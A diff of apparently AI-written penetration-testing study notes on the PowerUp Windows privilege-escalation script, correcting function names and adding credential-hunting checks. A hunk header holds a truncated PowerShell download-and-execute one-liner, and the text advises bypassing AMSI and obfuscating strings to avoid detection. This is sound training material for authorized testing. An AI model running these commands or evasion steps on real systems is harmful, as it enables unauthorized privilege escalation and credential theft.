@@ -39,7 +39,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://1
 ## Key Functions
 
 ```powershell
-# Run all checks
+# Run all checks — Invoke-AllChecks is an ALIAS for the real function Invoke-PrivescAudit
 Invoke-AllChecks
 
 # Unquoted service paths
@@ -54,24 +54,31 @@ Get-ModifiableService
 # AlwaysInstallElevated registry key
 Get-RegistryAlwaysInstallElevated
 
-# Weak registry permissions (service config)
-Get-RegistryAutoRun
+# Modifiable autorun binaries (Run/RunOnce entries with a writable target)
+Get-ModifiableRegistryAutoRun          # NOT "Get-RegistryAutoRun" — that name doesn't exist
 
-# DLL hijack opportunities (modifiable paths in %PATH%)
+# DLL hijack opportunities (modifiable paths in %PATH% / process imports)
 Find-PathDLLHijack
 Find-ProcessDLLHijack
 
-# Weak file/folder permissions
+# Weak file/folder permissions (helper used by the service checks)
 Get-ModifiablePath
 
-# Credentials in registry
+# Autologon creds in registry
 Get-RegistryAutoLogon
 
 # Cached GPP passwords
 Get-CachedGPPPassword
 
-# Token privileges
-Get-TokenPrivileges
+# Token privileges — the function is Get-ProcessTokenPrivilege (also *Group / *Type)
+Get-ProcessTokenPrivilege
+
+# Other real checks Invoke-AllChecks runs (often missed):
+Get-ModifiableScheduledTaskFile        # scheduled task with writable action
+Get-UnattendedInstallFile              # leftover unattend.xml / sysprep creds
+Get-SiteListPassword                   # McAfee SiteList.xml creds
+Get-WebConfig                          # web.config connection-string creds
+Get-ApplicationHost                    # IIS applicationHost.config app-pool creds
 ```
 
 ---
@@ -116,13 +123,13 @@ SharpUp source: https://github.com/GhostPack/SharpUp
 
 - PowerShell v5+ logs ScriptBlock content — bypass AMSI before loading
 - In-memory execution avoids AV file scanning
-- `Invoke-AllChecks` is a known string — obfuscate if needed
+- `Invoke-AllChecks` is a known string (and PowerSploit is archived/AMSI-signatured) — obfuscate if needed
 - Alternatively use Seatbelt for a broader host recon sweep
 
 
-> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — service misconfig and weak-permission checks.
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — service misconfig and weak-permission checks. Broader host survey: [[Tools/Scanning/Seatbelt|Seatbelt]]; all-in-one privesc enum: [[Tools/Scanning/winPEAS|winPEAS]]. Cash in a `SeImpersonate`/`SeAssignPrimaryToken` finding with [[Tools/Lateral Movement/Potato|Potato]].
 ---
 
 *Created: 2026-03-13*
-*Updated: 2026-08-18*
+*Updated: 2026-08-31*
 *Model: claude-opus-5*
